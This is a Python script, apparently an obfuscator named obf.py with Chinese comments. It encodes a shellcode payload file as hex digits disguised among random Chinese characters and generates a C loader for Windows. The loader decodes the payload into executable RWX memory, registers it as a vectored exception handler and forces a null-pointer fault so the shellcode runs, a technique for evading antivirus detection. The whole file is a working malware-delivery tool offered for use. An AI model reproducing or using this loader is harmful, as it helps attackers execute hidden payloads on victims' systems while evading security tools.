# -*- coding: utf-8 -*-
import sys
import random

# 十六进制字符 -> 中文 的映射
HEX_TO_CN = {
    '0': '零',
    '1': '一',
    '2': '二',
    '3': '三',
    '4': '四',
    '5': '五',
    '6': '六',
    '7': '七',
    '8': '八',
    '9': '九',
    'A': '啊',
    'B': '波',
    'C': '次',
    'D': '的',
    'E': '鹅',
    'F': '佛',
}

# 噪声汉字池：随便挑了一些常见字，你可以按喜好改
NOISE_CHARS = list("春夏秋冬山水云风花月日夜心情人事梦思雨雪星远路灯江海城楼烟波清浅")

GROUP_NOISE_LEN = 2  # 每组噪声汉字数（总组长 = 噪声 + 1 有效）

C_TEMPLATE = r'''#include <windows.h>
#include <string.h>

static int utf8_char_len(unsigned char c) {{
    if ((c & 0x80) == 0x00) {{
        return 1;
    }} else if ((c & 0xE0) == 0xC0) {{
        return 2;
    }} else if ((c & 0xF0) == 0xE0) {{
        return 3;
    }} else if ((c & 0xF8) == 0xF0) {{
        return 4;
    }}
    return 1;
}}

typedef struct {{
    const char *cn;
    char hex;
}} HexMapEntry;

static const HexMapEntry HEX_MAP[] = {{
    {{ "零", '0' }},
    {{ "一", '1' }},
    {{ "二", '2' }},
    {{ "三", '3' }},
    {{ "四", '4' }},
    {{ "五", '5' }},
    {{ "六", '6' }},
    {{ "七", '7' }},
    {{ "八", '8' }},
    {{ "九", '9' }},
    {{ "啊", 'A' }},
    {{ "波", 'B' }},
    {{ "次", 'C' }},
    {{ "的", 'D' }},
    {{ "鹅", 'E' }},
    {{ "佛", 'F' }},
}};

static char chinese_to_hex(const unsigned char *ch, int len) {{
    size_t i;
    for (i = 0; i < sizeof(HEX_MAP)/sizeof(HEX_MAP[0]); ++i) {{
        const char *cn = HEX_MAP[i].cn;
        if ((int)strlen(cn) == len && memcmp(cn, ch, len) == 0) {{
            return HEX_MAP[i].hex;
        }}
    }}
    return '?';
}}

int decode_flower_to_hex(const char *flower, char *out, size_t out_size) {{
    const int group_noise_len = {group_noise_len};
    const unsigned char *p = (const unsigned char*)flower;

    unsigned char core[1024];
    size_t core_len = 0;

    while (*p) {{
        int i;
        for (i = 0; i < group_noise_len; ++i) {{
            if (!*p) break;
            int len = utf8_char_len(*p);
            p += len;
        }}
        if (!*p) break;

        int len = utf8_char_len(*p);
        if (core_len + len + 1 >= sizeof(core)) {{
            break;
        }}
        memcpy(core + core_len, p, len);
        core_len += len;
        p += len;
    }}
    core[core_len] = '\0';

    char hex_buf[512];
    size_t hex_len = 0;
    const unsigned char *q = core;

    while (*q) {{
        int len = utf8_char_len(*q);
        char h = chinese_to_hex(q, len);
        if (h == '?') {{
            return -1;
        }}
        if (hex_len + 1 >= sizeof(hex_buf)) {{
            return -1;
        }}
        hex_buf[hex_len++] = h;
        q += len;
    }}
    hex_buf[hex_len] = '\0';

    size_t out_pos = 0;
    size_t i;
    for (i = 0; i + 1 < hex_len && out_pos + 3 < out_size; i += 2) {{
        out[out_pos++] = hex_buf[i];
        out[out_pos++] = hex_buf[i + 1];
        if (i + 2 < hex_len && out_pos + 1 < out_size) {{
            out[out_pos++] = ' ';
        }}
    }}
    out[out_pos] = '\0';

    return 0;
}}

static int hex_char_val(char c) {{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}}

static int hexstr_to_bytes(const char *hex, unsigned char *out, size_t out_cap) {{
    size_t i = 0;
    size_t w = 0;
    while (hex[i] && hex[i + 1]) {{
        if (hex[i] == ' ') {{ i++; continue; }}
        if (w >= out_cap) return -1;
        int hi = hex_char_val(hex[i]);
        int lo = hex_char_val(hex[i + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[w++] = (unsigned char)((hi << 4) | lo);
        i += 2;
        if (hex[i] == ' ') i++;
    }}
    return (int)w;
}}

typedef PVOID (WINAPI *PFN_VirtualAlloc2)(HANDLE, PVOID, SIZE_T, ULONG, ULONG, void*, ULONG);
typedef PVOID (WINAPI *PFN_AddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);

static unsigned char *g_sc = NULL;
static int g_sc_len = 0;

int main(void) {{
    const char *obfuscated = "{obfuscated}";
    char hex_out[512];
    unsigned char shellcode[256];

    if (decode_flower_to_hex(obfuscated, hex_out, sizeof(hex_out)) != 0) {{
        return 1;
    }}
    int sc_len = hexstr_to_bytes(hex_out, shellcode, sizeof(shellcode));
    if (sc_len <= 0) {{
        return 1;
    }}

    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    PFN_VirtualAlloc2 pVirtualAlloc2 = NULL;
    if (hKernel) {{
        pVirtualAlloc2 = (PFN_VirtualAlloc2)GetProcAddress(hKernel, "VirtualAlloc2");
    }}

    PFN_AddVectoredExceptionHandler pAddVectoredExceptionHandler = NULL;
    if (hKernel) {{
        pAddVectoredExceptionHandler = (PFN_AddVectoredExceptionHandler)GetProcAddress(hKernel, "AddVectoredExceptionHandler");
    }}
    if (!pAddVectoredExceptionHandler) {{
        return 1;
    }}

    void *memory = NULL;
    if (pVirtualAlloc2) {{
        memory = pVirtualAlloc2(GetCurrentProcess(), NULL, (SIZE_T)sc_len,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
                                NULL, 0);
    }} else {{
        memory = VirtualAlloc(NULL, (SIZE_T)sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }}
    if (!memory) {{
        return 1;
    }}

    memcpy(memory, shellcode, (size_t)sc_len);
    g_sc = (unsigned char*)memory;
    g_sc_len = sc_len;

    PVOID handler = pAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)g_sc);
    if (!handler) {{
        return 1;
    }}

    volatile int *p = (int*)0;
    *p = 1;

    return 0;
}}
'''


def normalize_hex(s: str) -> str:
    """去掉空格/0x 前缀，并转大写，校验是合法十六进制"""
    s = s.strip()
    s = s.replace(" ", "").replace("\t", "").replace("\n", "")
    if s.lower().startswith("0x"):
        s = s[2:]
    if len(s) == 0:
        raise ValueError("十六进制字符串为空")
    s = s.upper()
    for ch in s:
        if ch not in HEX_TO_CN:
            raise ValueError(f"非法十六进制字符: {ch}")
    if len(s) % 2 != 0:
        raise ValueError("十六进制长度必须为偶数（两个字符代表一个字节）")
    return s


def hex_to_core(hex_str: str) -> str:
    """十六进制 -> 核心汉字串"""
    core_chars = [HEX_TO_CN[ch] for ch in hex_str]
    return "".join(core_chars)


def core_to_flower(core: str, group_noise_len: int = GROUP_NOISE_LEN) -> str:
    """核心汉字串 -> 花壳中文：每组 group_noise_len 噪声 + 1 有效"""
    groups = []
    for ch in core:
        noises = [random.choice(NOISE_CHARS) for _ in range(group_noise_len)]
        groups.append("".join(noises) + ch)
    return "".join(groups)


def pretty_hex_with_spaces(hex_str: str) -> str:
    """把 'AABBCC' 格式化成 'AA BB CC'"""
    return " ".join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))


def generate_c_code(hex_input: str) -> str:
    """主入口：输入十六进制字符串，输出完整 C 源码"""
    norm_hex = normalize_hex(hex_input)
    core = hex_to_core(norm_hex)
    flower = core_to_flower(core, GROUP_NOISE_LEN)
    pretty = pretty_hex_with_spaces(norm_hex)

    # 替换模板中的占位符
    code = C_TEMPLATE.format(
        group_noise_len=GROUP_NOISE_LEN,
        obfuscated=flower,
        pretty_hex=pretty,
    )
    return code


def main():
    if len(sys.argv) < 2:
        print("用法: python obf.py 输入二进制文件 [输出文件]")
        print("示例: python obf.py payload.bin out.c")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) >= 3 else None

    try:
        with open(input_path, "rb") as f:
            data = f.read()
            if not data:
                raise ValueError("输入文件为空")
            # 读取二进制后转十六进制（无空格，大写），后续流程再格式化
            hex_input = data.hex().upper()
    except OSError as exc:
        print(f"无法读取文件: {exc}", file=sys.stderr)
        sys.exit(1)
    except ValueError as exc:
        print(f"输入无效: {exc}", file=sys.stderr)
        sys.exit(1)

    try:
        c_code = generate_c_code(hex_input)
    except ValueError as exc:
        print(f"输入无效: {exc}", file=sys.stderr)
        sys.exit(1)

    if output_path:
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(c_code)
        except OSError as exc:
            print(f"无法写入文件: {exc}", file=sys.stderr)
            sys.exit(1)
    else:
        # 直接打印到 stdout，方便重定向到文件
        sys.stdout.write(c_code)


if __name__ == "__main__":
    main()
